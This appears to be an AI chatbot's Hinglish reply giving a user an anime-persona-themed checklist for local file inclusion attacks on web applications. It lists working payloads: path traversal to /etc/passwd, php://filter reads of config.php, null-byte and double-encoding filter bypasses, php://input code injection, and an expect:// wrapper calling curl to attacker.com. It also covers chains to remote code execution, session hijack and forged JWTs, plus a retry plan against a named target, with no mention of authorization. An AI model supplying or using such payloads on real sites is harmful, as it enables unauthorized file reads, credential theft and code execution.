Bhai tune god-level bola — sabhi **custom modes** ka fusion wala **LFI Ghost Checklist** aa gaya.  
Ye tera *personal hacking compass* hai — **Glitch** ki creativity, **Chishiya** ki logic, **Arisu** ka emotional flow, **Gojo** ka power, **Sunny** ka clarity aur **Kira** ka dark mindset sab mila ke.

---

# **LFI Ghost Checklist v1.0**  
*(aka “Kaunsi file kis mode me dekhni chahiye”)*

---

### **[1] Glitch Mode: Try Unusual, Unexpected Paths**
> Glitch sochta hai: "What if this is broken in a way devs didn’t expect?"

- `?file=.././.././.././etc/passwd`
- `?template=/proc/self/environ`
- `?path=php://filter/convert.base64-encode/resource=config.php`
- `%00` null byte test: `?file=../../../../etc/passwd%00.jpg`
- LFI → SSRF via wrappers: `expect://curl http://attacker.com`

**Test style:** Creativity-based fuzzing

---

### **[2] Chishiya Mode: Logic + Filters**
> Chishiya checks what filters are there — and how to break them.

- Does `file` param filter `.php`? → Use `file=../../secret/.htaccess`  
- Is there extension append? `file=../../passwd` → server adds `.php`  
  → Bypass via: `file=../../passwd%00`
- Bypass `str_replace()` filter? → double encoding:
  - `%252e%252e%252f`

**Test style:** Break sanitization with logic

---

### **[3] Arisu Mode: Human + Emotional Focus**
> Arisu asks: “Why was this feature added? Can human laziness cause a bug?”

- Preview URLs like: `preview.php?doc=terms.html`
- Internal templates: `?view=internal_template.txt`
- Does it auto-load filenames from user uploads?
- LFI via error logs, or debug logs? (`/var/log/nginx/access.log`)

**Test style:** Look for places where devs took shortcuts

---

### **[4] Gojo Mode: Power Flow Mapping**
> Gojo builds full-chain logic, not just file read.

- Check for:
  - LFI → Log Poisoning → RCE
  - LFI → Session Hijack → Admin Panel Access
  - LFI → Read JWT Secret → Sign your own token
- Look for `php://input`, inject PHP payload in POST body

**Test style:** Weaponize LFI into full kill-chain

---

### **[5] Sunny Mode: Clarity, Simplicity, Memory-Hack**
> Sunny says: “Don't remember everything. Remember patterns.”

#### **Sunny Shortcut:**
> **“F-P-E-V”**

- **F**ile param hai?
- **P**ath traversal chal raha?
- **E**rror mil raha? Stack trace, path?
- **V**alidation ho rahi ya nahi?

If 3/4 YES → **LFI chance high**

**Bonus mnemonic:**
> “php://filter = base64 telescope”  
See what backend sees, without RCE.

---

### **[6] Kira Mode: Dark-side Advantage**
> Kira says: “Turn every rejection into weapon.”

- Save all LFI payloads that gave weird error
- Retry 1 week later after update / new upload
- Clone same vulnerable logic for your private lab
- Use `Burp Logger` to fingerprint where errors came from

**Kira mindset:**  
> “Aaj nahi toh kal, tuh karke dikhaunga.”

---

## **Ghost Vault Tip:**  
Make a `.md` note with:

```
## LFI Payloads Tried
- Basic path: ../../../../etc/passwd
- Filter bypass: php://filter/...
- Wrapper exploit: expect://, data://
- Extension poison: %00
- Upload + Include idea: ../../uploads/shell.php

## Where?
- Target: xyz.com
- Param: ?file=
- Result: Error / Inclusion / Nothing

## Retry?
- After 2 weeks
- After version update
```

---

## Want This as a PDF or GitHub Readme?
Ya ek interactive form bana doon jisme tu LFI test cases log karein directly?

Agla version me:
> Ghost Checklist: **File Upload + LFI Fusion** banayein?
